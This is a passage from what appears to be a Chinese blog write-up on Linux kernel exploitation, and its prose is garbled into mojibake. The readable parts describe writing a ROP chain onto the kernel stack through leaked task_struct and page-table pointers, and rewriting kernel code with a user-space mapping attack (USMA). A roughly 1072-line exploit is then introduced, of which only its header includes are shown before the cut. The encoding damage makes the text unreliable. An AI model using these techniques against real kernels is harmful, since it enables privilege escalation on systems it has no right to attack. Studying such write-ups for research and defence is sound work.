<p>ç¬¬äºŒç§æ–¹æ³•å°±æ˜¯é€šè¿‡å†™å†…æ ¸æ ˆå®ç°ROPçš„åŠæ³•ï¼Œé¦–å…ˆéœ€è¦æ³„æ¼å‡ºæ ˆåœ°å€ï¼Œåœ¨<code>task_struct</code>ç»“æ„ä½“ä¸­å­˜åœ¨ä¸€ä¸ªstackæˆå‘˜ï¼Œé¡¾åæ€ä¹‰å…¶ä¸­å­˜æ”¾çš„å°±æ˜¯æ ˆåœ°å€ï¼Œä¸è¿‡è¿™é‡Œå­˜æ”¾çš„æ˜¯è™šæ‹Ÿåœ°å€ã€‚ä¸è¿‡æˆ‘ä»¬å¦‚æœè¦å¾€æ ˆç©ºé—´ä¸­å†™å†…å®¹çš„è¯éœ€è¦çŸ¥é“ä»–å¯¹åº”çš„ç‰©ç†åœ°å€å¯¹åº”çš„pageç»“æ„åœ°å€ã€‚å¥½åœ¨æˆ‘ä»¬å¯ä»¥é€šè¿‡é¡µè¡¨è·å–åˆ°å¯¹åº”çš„ç‰©ç†åœ°å€ï¼Œåœ¨<code>task_struct</code>ç»“æ„ä½“ä¸­çš„<code>mm</code>æˆå‘˜ä¸­å­˜æ”¾çš„æ˜¯<code>mm_struct</code>ç»“æ„ä½“çš„åœ°å€ï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>mm_struct</code>ç»“æ„ä½“ä¸­çš„<code>pgd</code>æˆå‘˜è·å–åˆ°é¡µè¡¨çš„åœ°å€ã€‚æœ€åé€šè¿‡ä¹Ÿå˜è½¬åŒ–å³å¯è·å–åˆ°æ ˆåœ°å€å¯¹åº”çš„pageç»“æ„ä½“åœ°å€äº†ï¼Œè¿›è€Œå¾€æ ˆä¸­å†™å…¥å‡†å¤‡çš„ropå³å¯ã€‚</p>
<p>ç¬¬ä¸‰ç§æ–¹æ³•å°±æ˜¯é€šè¿‡<code>USMA</code>è¿›è¡Œåˆ©ç”¨ä¹Ÿå°±æ˜¯<a class="link"   target="_blank" rel="noopener" href="https://vul.360.net/archives/391" >ç”¨æˆ·æ€æ˜ å°„æ”»å‡»<i class="fas fa-external-link-alt"></i></a>ï¼ŒåŸç†åˆ™æ˜¯ä¿®æ”¹å†…æ ¸ä»£ç æ®µçš„å†…å®¹ï¼Œä¸è¿‡ç›´æ¥é€šè¿‡ç›´æ¥æ˜ å°„åŒºå»ä¿®æ”¹çš„è¯ä¼šå› ä¸ºæ²¡æœ‰å†™å…¥æƒé™é€ æˆ<code>kernel panic</code>ã€‚ä½†æ˜¯ï¼Œæ”¹å†™å†…æ ¸ä»£ç æ®µçš„æœ¬è´¨æ˜¯å‘å…¶æ‰€å¯¹åº”çš„ç‰©ç†é¡µé¢å†™å…¥æ•°æ®ï¼Œæ‰€ä»¥æ—¢ç„¶æˆ‘ä»¬å¯ä»¥å¯¹é¡µè¡¨è¿›è¡Œè¯»å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åœ¨ç”¨æˆ·ç©ºé—´å»ºç«‹ä¸€ä¸ªåˆ°å†…æ ¸ä»£ç æ®µå¯¹åº”ç‰©ç†å†…å­˜çš„æ˜ å°„å°±å¯ä»¥æ”¹å†™å†…æ ¸ä»£ç äº†ã€‚</p>
<h3 id="ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp"><a href="#ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp"></a>ç»¼ä¸Šæ‰€è¿°ï¼Œå¯å¾—exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 